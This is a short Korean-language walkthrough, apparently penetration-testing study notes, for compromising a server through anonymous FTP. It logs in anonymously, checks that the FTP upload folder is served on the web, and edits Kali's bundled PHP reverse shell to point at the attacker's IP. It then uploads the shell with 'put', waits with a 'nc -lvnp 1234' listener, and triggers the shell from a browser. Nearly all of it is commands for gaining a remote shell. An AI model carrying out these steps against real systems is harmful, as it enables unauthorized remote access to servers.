# 익명 FTP 로그인 및 리버스쉘 업로드 공격 단계별 총정리

---

## 1. 익명 로그인(Anonymous Login) 시도

- FTP 클라이언트로 접속
    ```
    ftp [타겟IP]
    ```
    - 아이디: `anonymous`
    - 비밀번호: 아무 값 입력
    - → 로그인 성공 시 익명 접근 허용

---

## 2. 파일/디렉토리 목록 확인

- 디렉토리 내 파일 목록 확인
    ```
    ftp> ls
    ```
    - `/upload/` 디렉터리에서 `index.php` 등 웹 관련 파일 확인

- 웹에서 파일 접근 가능 여부 확인
    ```
    http://[타겟IP]/index.php
    ```
    - 웹에서 FTP 파일 접근 가능 확인

---

## 3. 리버스쉘 파일 준비

- 칼리 리눅스 기본 제공 PHP 리버스쉘 코드 수정
    ```
    vi /usr/share/webshells/php/php-reverse-shell.php
    ```
    - 49번째 줄의 IP를 공격자(본인) IP로 수정

---

## 4. 웹쉘 업로드

- FTP 익명 로그인 후 웹쉘 업로드
    ```
    put /usr/share/webshells/php/php-reverse-shell.php upload/php-reverse-shell.php
    ```

---

## 5. 리버스쉘 대기

- 공격자 PC에서 Netcat 연결 대기
    ```
    nc -lvnp 1234
    ```

---

## 6. 웹쉘 실행

- 웹브라우저에서 업로드한 웹쉘 접근
    ```
    http://[타겟IP]/php-reverse-shell.php
    ```
    - 웹쉘 접근 시 Netcat 세션 연결 확인


